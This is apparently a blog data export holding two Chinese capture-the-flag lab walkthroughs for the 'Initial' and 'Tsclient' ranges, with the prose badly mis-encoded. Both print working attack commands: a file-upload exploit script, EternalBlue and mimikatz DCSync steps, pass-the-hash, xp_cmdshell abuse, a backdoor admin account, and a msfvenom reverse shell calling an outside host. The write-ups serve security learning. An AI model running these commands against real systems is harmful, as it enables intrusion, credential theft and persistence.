[{"content":" å‚è€ƒæ–‡ç« \nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\nèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\nFLAG1 fscanæ‰«ä¸€ä¸‹\n./fscan.exe -h 39.99.139.119 ç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\nå…ˆç”¨vshellä¸Šçº¿\nè¯»flagéœ€è¦ææƒ\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\nä¼ ä¸ªlinpeasæ‰«ä¸€ä¸‹\n./linpeas_linux_amd64 \u0026gt; output.txt åœ¨å†å²æ–‡ä»¶ä¸­æ‰¾åˆ°ç–‘ä¼¼è¯»flagçš„å‘½ä»¤\nå…¶å®è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„sudoææƒ\næ¸—é€æµ‹è¯•ï¼šLinuxææƒç²¾è®²ï¼ˆä¸‰ï¼‰ä¹‹sudoæ–¹æ³•ç¬¬ä¸‰æœŸ_nmap sudo ææƒ-CSDNåšå®¢\nmysql æ˜¯é…ç½®äº† sudo å…å¯†ä½¿ç”¨çš„ï¼Œå¯ä»¥ä½¿ç”¨ mysql ææƒï¼Œé€šè¿‡mysqlæ‰§è¡Œå‘½ä»¤æ¥è¯»flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- æ¥ä¸‹æ¥æ­ä»£ç†\næŸ¥å†…ç½‘ip\næ¥ç€ä¼ ä¸€ä¸ªfscanæ‰«ä¸€ä¸‹å†…ç½‘\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 æ”¶é›†åˆ°çš„ä¿¡æ¯\n172.22.1.2:DCåŸŸæ§\r172.22.1.21:Windowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´\r172.22.1.18:ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ FLAG2 å…ˆçœ‹ä¿¡å‘¼\nå¼±å£ä»¤æˆåŠŸç™»å…¥admin/admin123\nä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿv2.2.8å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´\n[Awesome-POC/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md at master Â· Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) å†™é©¬ä¹‹åç›´æ¥è¯»flagå°±è¡Œ\nflag02: 2ce3-4813-87d4- FLAG3 æ°¸æ’ä¹‹è“å¯ä»¥ç”¨msfæ‰“\nç°åœ¨kaliä¸Šç”¨proxychains4ç®€å•é…ä¸ªä»£ç†\nproxychains4 msfconsole\rsearch ms17-010 æœ‰å››ä¸ªä¸åŒçš„æ¨¡å—\nè¿™é‡Œä½¿ç”¨ç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œå› ä¸ºåˆ©ç”¨èŒƒå›´æ¯”è¾ƒå¹¿\nuse exploit/windows/smb/ms17_010_eternalblue # é€‰æ‹©ä½¿ç”¨çš„æ¨¡å—\rset payload windows/x64/meterpreter/bind_tcp_uuid # è®¾ç½®payloadï¼Œå¯ä»¥é€šè¿‡show payloadsæŸ¥çœ‹\rset RHOSTS 172.22.1.21 # è®¾ç½®é¶æœºçš„ip\rexploit # å‘èµ·æ”»å‡» æˆåŠŸäº†\nmeterpreter \u0026gt; screenshot # æ•è·å±å¹•\rmeterpreter \u0026gt; upload hello.txt c:// #ä¸Šä¼ æ–‡ä»¶\rmeterpreter \u0026gt; download d://1.txt # ä¸‹è½½æ–‡ä»¶\rmeterpreter \u0026gt; shell # è·å–cmd\rmeterpreter \u0026gt; clearev # æ¸…é™¤æ—¥å¿— load kiwi # è°ƒç”¨mimikatzæ¨¡å—\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯(åŒ…æ‹¬å“ˆå¸Œå€¼) æ‹¿åˆ°Administrator ç”¨æˆ·çš„ hashï¼Œæ¥ç€ä½¿ç”¨ crackmapexec æ¥è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ¥å®ç° DCåŸŸæ§ ä¸Šçš„ä»»æ„å‘½ä»¤æ‰§è¡Œ\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; æ‹¿åˆ°æœ€åä¸€ä¸ªflag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003eå‚è€ƒæ–‡ç« \u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"./assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscanæ‰«ä¸€ä¸‹\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"./assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"./assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…ˆç”¨vshellä¸Šçº¿\u003c/p\u003e\n\u003cp\u003eè¯»flagéœ€è¦ææƒ\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Initial-Writeup"},{"content":"Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\nå‚è€ƒæ–‡ç« \næ˜¥ç§‹äº‘é•œ TSclient \u0026ndash; Walkthrough - KingBridge - åšå®¢å›­\næ˜¥ç§‹äº‘å¢ƒ Tsclient | åˆé›¶Â·b10g~ğŸ¥\nFLAG1 å…ˆç”¨fscanæ‰«ä¸€ä¸‹\nmssqlæœåŠ¡æ˜¯å¼±å£ä»¤\nsa/1qaz!QAZ ç”¨æ•°æ®åº“ç®¡ç†å·¥å…·è¿ä¸Šå»\næ¥ä¸‹æ¥è¦çœ‹mssqlæ€ä¹ˆè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/7129\nåˆ¤æ–­xp_cmdshellçŠ¶æ€\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; å­˜åœ¨\né‚£æˆ‘ä»¬æ¥ä¸‹æ¥å¯åŠ¨å®ƒ\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; é…ç½®é€‰é¡¹ \u0026#39;xp_cmdshell\u0026#39; å·²ä» 0 æ›´æ”¹ä¸º 1ã€‚è¯·è¿è¡Œ RECONFIGURE è¯­å¥è¿›è¡Œå®‰è£…ã€‚ å¯åŠ¨æˆåŠŸ\næ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; æ¥ä¸‹æ¥ç›´æ¥vshellä¸€å¥è¯ä¸Šçº¿\næ²¡æ‰¾åˆ°flagï¼Œå‘ç°Administratoræ–‡ä»¶å¤¹æ²¡æœ‰æƒé™\næƒ³åˆ°è¦ææƒï¼Œä¼ ä¸€ä¸ªPrintSpooferè¿›è¡Œææƒ\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd ææƒä¹‹åæ‹¿åˆ°flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... ææƒä¹‹åç”¨ææƒåçš„è´¦æˆ·é‡æ–°ä¸Šä¸€ä¸‹çº¿\næ¥ä¸‹æ¥ç”¨fscanæ‰«ä¸€ä¸‹å†…ç½‘\n1â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” 2â”‚ ___ _ â”‚ 3â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚ 4â”‚ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / â”‚ 5â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; â”‚ 6â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚ 7â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1 11[2025-03-09 19:53:19] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ 12[2025-03-09 19:53:19] [INFO] CIDRèŒƒå›´: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] è§£æCIDR 172.22.8.0/24 -\u0026gt; IPèŒƒå›´ 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256 16[2025-03-09 19:53:20] [INFO] å¼€å§‹ä¸»æœºæ‰«æ 17[2025-03-09 19:53:20] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹... 18[2025-03-09 19:53:20] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ… 19[2025-03-09 19:53:20] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹... 20[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.31 å­˜æ´» (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.18 å­˜æ´» (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.15 å­˜æ´» (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] ç›®æ ‡ 172.22.8.46 å­˜æ´» (ICMP) 24[2025-03-09 19:53:23] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4 25[2025-03-09 19:53:23] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233 26[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:1433 =\u0026gt; [ms-sql-s] ç‰ˆæœ¬:13.00.1601 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 17 61[2025-03-09 19:54:30] [INFO] å¼€å§‹æ¼æ´æ‰«æ 62[2025-03-09 19:54:30] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 64ç›®æ ‡ä¸»æœº: 172.22.8.18 65ä¸»æœºå: WIN-WEB 66å‘ç°çš„ç½‘ç»œæ¥å£: 67 IPv4åœ°å€: 68 â””â”€ 172.22.8.18 69 IPv6åœ°å€: 70 â””â”€ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 73ç›®æ ‡ä¸»æœº: 172.22.8.15 74ä¸»æœºå: DC01 75å‘ç°çš„ç½‘ç»œæ¥å£: 76 IPv4åœ°å€: 77 â””â”€ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 79ç›®æ ‡ä¸»æœº: 172.22.8.46 80ä¸»æœºå: WIN2016 81å‘ç°çš„ç½‘ç»œæ¥å£: 82 IPv4åœ°å€: 83 â””â”€ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ 85ç›®æ ‡ä¸»æœº: 172.22.8.31 86ä¸»æœºå: WIN19-CLIENT 87å‘ç°çš„ç½‘ç»œæ¥å£: 88 IPv4åœ°å€: 89 â””â”€ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.46 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.18 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] æ‰«æå·²å®Œæˆ: 32/32 æ‰«åˆ°ä¸‰å°æœºå­\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 æ²¡æœ‰ä»€ä¹ˆèƒ½ç›´æ¥åˆ©ç”¨çš„æœåŠ¡\né‚£æˆ‘ä»¬æ¥ç€ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nnet user ä¸»æœºå: WIN-WEB\rOS åç§°: Microsoft Windows Server 2016 Datacenter\rOS ç‰ˆæœ¬: 10.0.14393 æš‚ç¼º Build 14393\rOS åˆ¶é€ å•†: Microsoft Corporation\rOS é…ç½®: ç‹¬ç«‹æœåŠ¡å™¨\rOS æ„ä»¶ç±»å‹: Multiprocessor Free\ræ³¨å†Œçš„æ‰€æœ‰äºº:\ræ³¨å†Œçš„ç»„ç»‡: Aliyun\räº§å“ ID: 00376-40000-00000-AA947\råˆå§‹å®‰è£…æ—¥æœŸ: 2022/7/11, 12:46:14\rç³»ç»Ÿå¯åŠ¨æ—¶é—´: 2025/3/9, 18:28:29\rç³»ç»Ÿåˆ¶é€ å•†: Alibaba Cloud\rç³»ç»Ÿå‹å·: Alibaba Cloud ECS\rç³»ç»Ÿç±»å‹: x64-based PC\rå¤„ç†å™¨: å®‰è£…äº† 1 ä¸ªå¤„ç†å™¨ã€‚\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS ç‰ˆæœ¬: SeaBIOS 449e491, 2014/4/1\rWindows ç›®å½•: C:\\Windows\rç³»ç»Ÿç›®å½•: C:\\Windows\\system32\rå¯åŠ¨è®¾å¤‡: \\Device\\HarddiskVolume1\rç³»ç»ŸåŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\rè¾“å…¥æ³•åŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)\ræ—¶åŒº: (UTC+08:00) åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½\rç‰©ç†å†…å­˜æ€»é‡: 3,950 MB\rå¯ç”¨çš„ç‰©ç†å†…å­˜: 883 MB\rè™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 5,848 MB\rè™šæ‹Ÿå†…å­˜: å¯ç”¨: 1,169 MB\rè™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 4,679 MB\ré¡µé¢æ–‡ä»¶ä½ç½®: C:\\pagefile.sys\råŸŸ: WORKGROUP\rç™»å½•æœåŠ¡å™¨: æš‚ç¼º\rä¿®è¡¥ç¨‹åº: å®‰è£…äº† 6 ä¸ªä¿®è¡¥ç¨‹åºã€‚\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\rç½‘å¡: å®‰è£…äº† 1 ä¸ª NICã€‚\r[01]: Red Hat VirtIO Ethernet Adapter\rè¿æ¥å: ä»¥å¤ªç½‘\rå¯ç”¨ DHCP: æ˜¯\rDHCP æœåŠ¡å™¨: 172.22.255.253\rIP åœ°å€\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V è¦æ±‚: å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚ C:\\Tmp\u0026gt;net user\r\\\\ çš„ç”¨æˆ·å¸æˆ·\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\rå‘½ä»¤è¿è¡Œå®Œæ¯•ï¼Œä½†å‘ç”Ÿä¸€ä¸ªæˆ–å¤šä¸ªé”™è¯¯ã€‚ C:\\Tmp\u0026gt;quser\rç”¨æˆ·å ä¼šè¯å ID çŠ¶æ€ ç©ºé—²æ—¶é—´ ç™»å½•æ—¶é—´\rjohn rdp-tcp#0 2 è¿è¡Œä¸­ 2:38 2025/3/9 18:30 å‘ç°ä¸€ä¸ªjohnç”¨æˆ·è¿œç¨‹è¿æ¥æœ¬å°æœºå­\nä¸ºäº†æ–¹ä¾¿å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·rdpè¿ä¸Šå»\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\rå‘½ä»¤æˆåŠŸå®Œæˆã€‚\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\ræ“ä½œæˆåŠŸå®Œæˆã€‚ ç®¡ç†å‘˜æƒé™å¯ä»¥å·RDPç”¨æˆ·çš„tokenï¼Œä»è€ŒæŸ¥çœ‹å…¶æŒ‚è½½çš„ç›˜ã€‚\nè¿™é‡Œå¯ä»¥ç”¨msfçš„incognitoæ¨¡å—\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe å…ˆç”¨msfä¸Šä¸ªçº¿\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit ä¸Šçº¿\næ¥ç€ç”¨incognitoæ¨¡å—å·Johnçš„token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available å¯ä»¥çœ‹åˆ°å·²ç»æ‹¿åˆ°Johnçš„tokenäº†\nä»¥Johnçš„èº«ä»½è¿è¡Œcmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 